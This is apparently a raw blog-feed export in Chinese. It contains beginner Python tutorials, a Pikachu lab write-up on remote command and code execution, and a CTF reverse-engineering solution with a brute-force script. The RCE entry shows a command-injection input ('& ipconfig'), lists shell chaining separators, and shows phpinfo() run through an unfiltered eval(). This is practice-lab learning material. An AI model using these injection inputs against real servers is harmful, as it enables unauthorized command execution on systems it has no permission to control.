class="hljs-string">'人生苦短，我用python'</span>)</span><br></code></pre></td></tr></tbody></table></figure><p>eg:计算1-100之间偶数和</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">sum</span>=0<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,101):<br>    <span class="hljs-keyword">if</span> i%<span class="hljs-attribute">2</span>==0:<br>        sum+=i<br><span class="hljs-built_in">print</span>(sum)<br></code></pre></td></tr></tbody></table></figure><p>eg: 计算千以内的水仙花数</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> range(100,1000):<br>    <span class="hljs-attribute">c</span>=n%10<br>    <span class="hljs-attribute">b</span>=n//10%10<br>    <span class="hljs-attribute">a</span>=n//100<br>    <span class="hljs-keyword">if</span> <span class="hljs-attribute">n</span>==a**3+b**3+c**3:<br>        <span class="hljs-built_in">print</span>(n)<br></code></pre></td></tr></tbody></table></figure><p>3、流程控制语句break</p><p>用于结束循环结构</p><p>eg:录入密码，最多输入三次，正确则结束退出。</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">3</span>):</span><br><span class="hljs-function">    <span class="hljs-variable">pwd</span>=<span class="hljs-title">input</span>(<span class="hljs-string">'请输入密码：'</span>)</span><br>    <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">pwd</span>==<span class="hljs-string">'8'</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'正确'</span>)</span><br>        <span class="hljs-variable">break</span><br>    <span class="hljs-variable"><span class="hljs-keyword">else</span></span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'错误'</span>)</span><br></code></pre></td></tr></tbody></table></figure><p>4、continue 结束当前循环，进入下一循环。</p><p>eg: 1-50之间5的倍数：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">51</span>):<br>    <span class="hljs-attribute">if</span> i%<span class="hljs-number">5</span>!=<span class="hljs-number">0</span>:<br>        <span class="hljs-attribute">continue</span><br>    <span class="hljs-attribute">print</span>(i)<br></code></pre></td></tr></tbody></table></figure><p>5、else 语句</p><p>eg:</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">3</span>):</span><br><span class="hljs-function">    <span class="hljs-variable">pwd</span>=<span class="hljs-title">input</span>(<span class="hljs-string">"请输入密码："</span>)</span><br>    <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">pwd</span>==<span class="hljs-string">'8'</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'True'</span>)</span><br>        <span class="hljs-variable">break</span><br>    <span class="hljs-variable"><span class="hljs-keyword">else</span></span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'False'</span>)</span><br><span class="hljs-variable"><span class="hljs-keyword">else</span></span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'Sorry,the three times all False'</span>)</span><br></code></pre></td></tr></tbody></table></figure><p>6、嵌套循环</p><p>eg: 三行四列的矩形</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(3):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(1,5):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'*'</span>,<span class="hljs-attribute">end</span>=<span class="hljs-string">'\t'</span>)<br>    <span class="hljs-built_in">print</span>()   <br></code></pre></td></tr></tbody></table></figure><p>eg: 左侧三角型</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,10):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(1,i+1):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'*'</span>,<span class="hljs-attribute">end</span>=<span class="hljs-string">''</span>)<br>    <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></tbody></table></figure><p>eg: 打印乘法表</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,10):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(1,i+1):<br>        <span class="hljs-built_in">print</span>(i,<span class="hljs-string">'*'</span>,j,<span class="hljs-string">'='</span>,i*j,<span class="hljs-attribute">end</span>=<span class="hljs-string">'    '</span>)<br>    <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></tbody></table></figure><p>7、二重循环中break和continue</p><p>eg:</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">5</span>):<br>    <span class="hljs-attribute">for</span> j in range(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>):<br>        <span class="hljs-attribute">if</span> j%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>            <span class="hljs-attribute">break</span><br>        <span class="hljs-attribute">print</span>(j)<br></code></pre></td></tr></tbody></table></figure><p>j=1时，break退回外层循环，此后只执行外层循环；改成continue后，内循环将跳回 <code>for j in range(1,11)</code> 上</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pikachu-RCE</title>
    <link href="/2022/08/11/pikachu-RCE/"/>
    <url>/2022/08/11/pikachu-RCE/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>RCE (remote command/code execute),可以让攻击者直接向后台服务器远程注入操作系统命令或代码，从而控制后台系统。</p><h2 id="远程系统命令执行"><a href="#远程系统命令执行" class="headerlink" title="远程系统命令执行"></a>远程系统命令执行</h2><p>一般出现这种漏洞是因为应用系统从设计上需要给用户提供指定的远程命令操作接口。一般会给用户一个ping操作的web界面，用户从web界面输入目标ip,提交后会对该IP地址进行一次ping测试，并返回测试结果。没有安全控制的话会导致攻击者通过该接口提交恶意命令，后台执行会控制整个后台服务器。</p><h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><p>后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略</p><pre><code class="hljs">exec "ping"</code></pre><p><img src="https://s2.loli.net/2022/08/11/bzJDf953yhviwBW.png" alt="图片.png"></p><p>ping一下本地返回正常。</p><p>输入命令： <code>www.baidu.com &amp; ipconfig</code> 发现可以获取到用户的ip地址。</p><p>“&amp;”的作用是先执行 <code>www.baidu.com</code></p><p>或者： &amp;、&amp;&amp;、|、||、； 等拼接执行命令。</p><pre><code class="hljs">exec "eval"</code></pre><p><img src="https://s2.loli.net/2022/08/11/3mcQnH1T2xrGCIb.png" alt="图片.png"></p><p>不知道为啥输入什么都报错</p><p><img src="https://s2.loli.net/2022/08/11/2I6MyJS4YBCxTpW.png" alt="图片.png"></p><p>看了一下网页代码，啥也没有，查看了后台源代码：</p><p><img src="https://s2.loli.net/2022/08/11/2I6MyJS4YBCxTpW.png" alt="图片.png"><br><img src="https://s2.loli.net/2022/08/11/OKkmEnHDoWRN94B.png" alt="图片.png"></p><p>用户输入值直接被带入到<code>eval()</code>函数中进行执行，没有任何安全处理。</p><p>输入 <code>phpinfo(); </code>返回显示了php系统信息。</p><p>eval函数的作用是将字符串当作php代码执行，它允许执行任意 PHP 代码</p><p>它允许执行任意 PHP 代码。</p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>pikachu</tag>
      
      <tag>RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python学习1</title>
    <link href="/2022/08/10/python%E5%AD%A6%E4%B9%A01/"/>
    <url>/2022/08/10/python%E5%AD%A6%E4%B9%A01/</url>
    
    <content type="html"><![CDATA[<h2 id="输出函数print"><a href="#输出函数print" class="headerlink" title="输出函数print()"></a>输出函数print()</h2><p>1.可输出数字、字符串、表达式</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-number">520</span>)</span></span> <span class="hljs-number">#520</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'HelloWorld'</span>)</span></span> <span class="hljs-selector-id">#HelloWorld</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-number">3</span>+<span class="hljs-number">1</span>)</span></span> #<span class="hljs-number">4</span><br></code></pre></td></tr></tbody></table></figure><p>2.将数据输出文件中 <code>file=fp</code></p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">fp=<span class="hljs-built_in">open</span>(<span class="hljs-string">'D:/text.txt'</span>,<span class="hljs-string">'a+'</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'Hello'</span>,file=fp)</span></span><br>fp<span class="hljs-selector-class">.close</span>()<br></code></pre></td></tr></tbody></table></figure><blockquote><p><code>a+</code> 若文件不存在则创建，存在则在文件内容后追加，读写。</p></blockquote><p>3.不进行换行输出</p><p><code>print('Hello','world','python') #Hello world python</code></p><h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><ol><li></li></ol><p><code>\n</code> - 换行；<code>\r</code> - 回车；<code>\t</code> - 水平制表符；<code>\b</code> - 退格；</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'hello\rworld'</span>)</span></span> <span class="hljs-selector-id">#world</span> #world将hello覆盖<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'hello\bworld'</span>)</span></span> <span class="hljs-selector-id">#hellworld</span> #\b退格，将o退没了<br></code></pre></td></tr></tbody></table></figure><p>2.原字符，在字符串前加r或R，可使字符串内转义字符失效。</p><pre><code class="hljs">print(r'hello\nworld') #hello\nworld</code></pre><p>注意：字符串最后一个字符不可为斜杠。</p><h2 id="进制，字符编码，标识符，保留字"><a href="#进制，字符编码，标识符，保留字" class="headerlink" title="进制，字符编码，标识符，保留字"></a>进制，字符编码，标识符，保留字</h2><p>1Byte(字节)=8bit(位)</p><p>1KB(千字节)=1024Byte</p><p>1MB(兆字节)=1024KB</p><p>1GB(吉字节)=1024MB</p><p>1TB(太字节)=1024GB</p><p>标识符：字母、数字、下划线（不可以数字开头，严格区分大小写）</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>内存中一个带标签的空间</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">name=<span class="hljs-string">'Lihua'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'标识'</span>,id(name)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'类型'</span>,type(name)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'值'</span>,name)</span></span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight angelscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">标识 <span class="hljs-number">1694477549296</span><br>类型 &lt;<span class="hljs-keyword">class</span> '<span class="hljs-symbol">str</span>'&gt;<br>值 <span class="hljs-symbol">Lihua</span><br></code></pre></td></tr></tbody></table></figure><p>多次赋值后，变量名会指向新的使用。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="int-整型"><a href="#int-整型" class="headerlink" title="int 整型"></a>int 整型</h3><ul><li>十进制 默认的进制0-9</li><li>二进制 以0b开头0,1</li><li>八进制 以0o开头0-7</li><li>十六禁止 以0x开头0-9，A-F</li></ul><h3 id="float-浮点型"><a href="#float-浮点型" class="headerlink" title="float 浮点型"></a>float 浮点型</h3><p>存储具有不精确性，可导入模块Decimal</p><figure class="highlight lasso"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso">from <span class="hljs-built_in">decimal</span> <span class="hljs-keyword">import</span> <span class="hljs-built_in">Decimal</span><br>print(<span class="hljs-built_in">Decimal</span>(<span class="hljs-string">'1.1'</span>)+<span class="hljs-built_in">Decimal</span>(<span class="hljs-string">'2.2'</span>)) #3<span class="hljs-number">.3</span><br></code></pre></td></tr></tbody></table></figure><h3 id="str-字符串类型；bool-布尔类型"><a href="#str-字符串类型；bool-布尔类型" class="headerlink" title="str 字符串类型；bool 布尔类型"></a>str 字符串类型；bool 布尔类型</h3><p>字符串可用单引号、双引号、三引号或””” “””定义。</p><p>单引号双引号定义的字符串需要在一行；三引号可多行；</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span>=<span class="hljs-string">'''人生苦短，</span><br><span class="hljs-string">我用python'''</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight mel"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">人生苦短，<br>我用<span class="hljs-keyword">python</span><br></code></pre></td></tr></tbody></table></figure><h3 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h3><ul><li>str() 其他转字符串，也可以引号转</li><li>int() 其他转整形，文字和小数不能转，浮点数抹零取整</li><li>float() 其他转浮点，文字类不可转，整数转浮点末尾加.0</li></ul><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">name</span>=<span class="hljs-string">'张三'</span><br><span class="hljs-attribute">age</span>=20<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'我叫'</span>+name+<span class="hljs-string">'，今年'</span>+str(age)+<span class="hljs-string">'岁'</span>)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">a=<span class="hljs-number">10</span><br>b=<span class="hljs-number">98.9</span><br>c=False<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(a)</span></span>,<span class="hljs-built_in">type</span>(b),<span class="hljs-built_in">type</span>(c))<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(str(a)</span></span>,<span class="hljs-built_in">str</span>(b),<span class="hljs-built_in">str</span>(c),<span class="hljs-built_in">type</span>(<span class="hljs-built_in">str</span>(a)),<span class="hljs-built_in">type</span>(<span class="hljs-built_in">str</span>(b)),<span class="hljs-built_in">type</span>(<span class="hljs-built_in">str</span>(c)))<br></code></pre></td></tr></tbody></table></figure><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'int'</span>&gt; &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'float'</span>&gt; &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'bool'</span>&gt;<br><span class="hljs-number">10</span> <span class="hljs-number">98.9</span> <span class="hljs-literal">False</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'str'</span>&gt; &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'str'</span>&gt; &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'str'</span>&gt;<br></code></pre></td></tr></tbody></table></figure><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s1=<span class="hljs-number">128</span><br>f1=<span class="hljs-number">98.7</span><br>s2=<span class="hljs-string">'76.77'</span><br>ff=True<br>s3=<span class="hljs-string">'hello'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(int(s1)</span></span>,<span class="hljs-built_in">type</span>(<span class="hljs-built_in">int</span>(s1))) <span class="hljs-number">#128</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(int(f1)</span></span>,<span class="hljs-built_in">type</span>(<span class="hljs-built_in">int</span>(f1))) #<span class="hljs-number">98</span><br> <span class="hljs-selector-id">#print</span>(<span class="hljs-built_in">int</span>(s2),<span class="hljs-built_in">type</span>(<span class="hljs-built_in">int</span>(s2))) <span class="hljs-selector-id">#Error</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(int(ff)</span></span>,<span class="hljs-built_in">type</span>(<span class="hljs-built_in">int</span>(ff))) #<span class="hljs-number">1</span><br> <span class="hljs-selector-id">#print</span>(<span class="hljs-built_in">int</span>(s3),<span class="hljs-built_in">type</span>(<span class="hljs-built_in">int</span>(s3))) #Error<br></code></pre></td></tr></tbody></table></figure><figure class="highlight basic"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">128 </span>&lt;class <span class="hljs-comment">'int'&gt;</span><br><span class="hljs-symbol">98 </span>&lt;class <span class="hljs-comment">'int'&gt;</span><br><span class="hljs-symbol">1 </span>&lt;class <span class="hljs-comment">'int'&gt;</span><br></code></pre></td></tr></tbody></table></figure><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>单行：#</p><p>多行：三引号</p><p>中文编码声明： <code>#coding:utf-8</code></p><h2 id="输入函数input"><a href="#输入函数input" class="headerlink" title="输入函数input()"></a>输入函数input()</h2><p>接收用户输入，返回类型str，存储’=’</p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>1.算术运算符</p><p>加+  减-  乘*  除/  整除//  取余%  幂**</p><p>整除（一正一负向下取整）</p><p>取余（余数=被除数-除数*商）</p><p>2、赋值运算符 ‘=’</p><p>执行：从右至左；</p><p>+=、-=、*=、/=、//=、%=</p><pre><code class="hljs">a,b,c=10,20,30</code></pre><p><code>a+=30 # a=a+30</code></p><p>3.比较运算符 结果为bool</p><ul><li><blockquote><p>、&lt;、==、!=(不等于)、is、is not</p></blockquote></li><li>布尔：and,or,not,in,not in</li></ul><p>5.位运算符</p><p>与&amp; 11为1，否则为0</p><p>或| 00为0，否则为1</p><p>左移位&lt;&lt; 高位溢出舍弃，低位补0 （相当于乘2）</p><p>右移位&gt;&gt; 低位溢出舍弃，高位补0  （相当于除以2）</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">print</span>(<span class="hljs-number">4</span>&amp;<span class="hljs-number">8</span>) # <span class="hljs-number">0</span><br><span class="hljs-attribute">print</span>(<span class="hljs-number">4</span>|<span class="hljs-number">8</span>) # <span class="hljs-number">12</span><br><span class="hljs-attribute">print</span>(<span class="hljs-number">4</span>&lt;&lt;<span class="hljs-number">1</span>) #<span class="hljs-number">8</span><br><span class="hljs-attribute">print</span>(<span class="hljs-number">4</span>&gt;&gt;<span class="hljs-number">1</span>) #<span class="hljs-number">2</span><br><span class="hljs-attribute">print</span>(<span class="hljs-number">4</span>&lt;&lt;<span class="hljs-number">2</span>) #<span class="hljs-number">16</span><br><span class="hljs-attribute">print</span>(<span class="hljs-number">4</span>&gt;&gt;<span class="hljs-number">2</span>) #<span class="hljs-number">1</span><br></code></pre></td></tr></tbody></table></figure><p>6.优先级</p><p>算术&gt;位&gt;比较&gt;布尔&gt;赋值</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SimpleRev</title>
    <link href="/2022/08/10/SimpleRev-buu-Re/"/>
    <url>/2022/08/10/SimpleRev-buu-Re/</url>
    
    <content type="html"><![CDATA[<p>IDA打开查看字符串，直接点进<code>Congratulation</code>找到关键函数<code>Decry()</code></p><p>浅分析一下</p><figure class="highlight plaintext"><figcaption><span>Decry()</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs __int64">{<br>  char *v0; <br>  char v2; <br>  int v3; <br>  signed int v4; <br>  signed int i; <br>  signed int v6; <br>  char src[8]; <br>  __int64 v8; <br>  int v9; <br>  __int64 v10; <br>  __int64 v11; <br>  int v12; <br>  __int64 v13; <br>  v13 = *MK_FP(__FS__, 40LL);<br>  *(_QWORD *)src = 'SLCDN';<br>  v8 = 0LL;<br>  v9 = 0;<br>  v10 = 'wodah';<br>  v11 = 0LL;<br>  v12 = 0;<br>  LODWORD(v0) = join(key3, &amp;v10); <br>// 小端序存储，v10要倒过来看：text=killshadow<br>  text = v0;<br>  strcpy(key, key1);  <br>  strcat(key, src);  // key=ADSFKNDCLS<br>  v3 = 0;<br>  v4 = 0;<br>  getchar();<br>  v6 = strlen(key);<br>// for循环是为了大写变小写<br>  for ( i = 0; i &lt; v6; ++i )<br>  {<br>    if ( key[v4 % v6] &gt; 64 &amp;&amp; key[v4 % v6] &lt;= 90 )<br>      key[i] = key[v4 % v6] + 32;<br>    ++v4;<br>  }<br>  printf("Please input your flag:", src);<br>  while ( 1 )<br>  {<br>    v2 = getchar();<br>    if ( v2 == 10 )<br>      break;<br>    if ( v2 == 32 )<br>    {<br>      ++v3;<br>    }<br>    else<br>    {<br>      if ( v2 &lt;= 96 || v2 &gt; 122 )<br>      {<br>        if ( v2 &gt; 64 &amp;&amp; v2 &lt;= 90 )<br>          str2[v3] = (v2 - 39 - key[v4++ % v6] + 97) % 26 + 97;<br>      }<br>      else<br>      {<br>        str2[v3] = (v2 - 39 - key[v4++ % v6] + 97) % 26 + 97; //核心代码<br>      }<br>      if ( !(v4 % v6) )<br>        putchar(32);<br>      ++v3;<br>    }<br>  }<br>//经过加密后str2与text一致得到Congratulation，则加密前的str2就是flag<br>  if ( !strcmp(text, str2) )<br>    puts("Congratulation!\n");<br>  else<br>    puts("Try again!\n");<br>  return *MK_FP(__FS__, 40LL) ^ v13;<br>}<br></code></pre></td></tr></tbody></table></figure><p>有取余，没法逆推，用爆破：</p><figure class="highlight processing"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs processing">py脚本：<br><span class="hljs-built_in">key</span>=<span class="hljs-string">"ADSFKNDCLS"</span><br><span class="hljs-built_in">text</span>=<span class="hljs-string">"killshadow"</span><br>s=<span class="hljs-string">""</span><br>flag=<span class="hljs-string">""</span><br><span class="hljs-built_in">loop</span>=<span class="hljs-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><br>v2 = <span class="hljs-number">0</span><br>v3 = <span class="hljs-number">0</span><br>v5 = <span class="hljs-title function_">len</span>(<span class="hljs-built_in">key</span>)<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_">range</span>(<span class="hljs-number">0</span>,v5):<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_">ord</span>(<span class="hljs-built_in">key</span>[i]) &gt; <span class="hljs-number">64</span> and <span class="hljs-title function_">ord</span>(<span class="hljs-built_in">key</span>[i]) &lt;= <span class="hljs-number">90</span> ):<br>        s += <span class="hljs-title function_">chr</span>(<span class="hljs-title function_">ord</span>(<span class="hljs-built_in">key</span>[i]) + <span class="hljs-number">32</span>)<br>    <span class="hljs-keyword">else</span>:<br>        s +=<span class="hljs-built_in">key</span>[i]<br><span class="hljs-built_in">print</span>(s)<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_">range</span>(<span class="hljs-number">0</span>,<span class="hljs-title function_">len</span>(<span class="hljs-built_in">text</span>)):<br>    <span class="hljs-keyword">for</span> j in <span class="hljs-built_in">loop</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-title function_">ord</span>(<span class="hljs-built_in">text</span>[i])==(<span class="hljs-title function_">ord</span>(j)<span class="hljs-number">-39</span>-<span class="hljs-title function_">ord</span>(s[i])+<span class="hljs-number">97</span>)%<span class="hljs-number">26</span>+<span class="hljs-number">97</span>:<br>            flag+=j<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 